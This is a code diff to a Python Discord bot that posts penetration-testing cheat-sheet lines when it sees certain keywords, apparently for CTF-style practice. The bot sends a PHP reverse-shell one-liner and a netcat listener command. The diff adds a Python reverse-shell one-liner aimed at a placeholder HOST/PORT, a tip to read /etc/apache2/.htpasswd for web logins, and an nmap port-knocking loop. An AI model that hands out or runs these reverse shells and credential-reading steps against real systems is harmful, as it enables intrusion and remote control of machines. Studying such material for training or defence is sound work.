@@ -75,6 +75,7 @@ crack = ['hash', 'hashes', 'cracking', 'crack', 'bruteforce', 'dictionary', 'rul
 upload = ['payload', 'upload', 'payloads', 'uploading', 'uploads', 'meterpreter']
 lpshell = ['low', 'privelege', 'low-privelege', 'escalate', 'escalation']
 gits = ['tool', 'tools', 'extra', 'helpful', 'other']
+tips = ['hint', 'tip', 'hints', 'tips', 'helpful']
 
 @client.event
 async def on_message(message):
@@ -125,6 +126,7 @@ async def on_message(message):
         if i in message.content.lower():
             await channel.send("Payloading Methods:")
             await channel.send("""--sudo /usr/bin/php -r '$sock=fsockopen("YOUR IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");' #php one liner if user has sudo for php""")
+            await channel.send("""--python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("HOST",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' #python2.7 one liner """)
             await channel.send("--nc -lvp 4444 #setup listener for payloads on port 4444")
             await channel.send("""--python -c 'import pty; pty.spawn("/bin/bash")' #upgrades nc shell to full TTY shell for su change""")
             await channel.send("--msfconsole use /exploit/multi/handler #metasploit payload listener")
@@ -150,6 +152,14 @@ async def on_message(message):
             await channel.send("--wfuzz & dirbuster # webapp file enumeration tools")
             await channel.send("--metasploit-framework and recon-ng #metasploit is a pentesting exploitation framework with thousands of vulnerabilities and payloads and recon-ng is a webapp OSINT tool")
             break
+
+    for i in tips:
+        if i in message.content.lower():
+            await channel.send("Tips:")
+            await channel.send("--apache2 servers sometimes store weblogins in /etc/apache2/.htpasswd")
+            await channel.send("--checking if there's a robots.txt file in web dir can help with dir traversal")
+            await channel.send("--if /etc/knockd.conf present then look inside for 3 port #s, use this one liner to open a closed port: for x in PORT1 PORT2 PORT3; do nmap -Pn --max-retries 0 -p $x IP; done")
+            await channel.send("--Google and question everything! Research services, programs, and exploits!")
 
     if message.content == "/nickname": #if author types /nickname bot asks for input for new nickname
         await channel.send("Type /name nicknamehere")
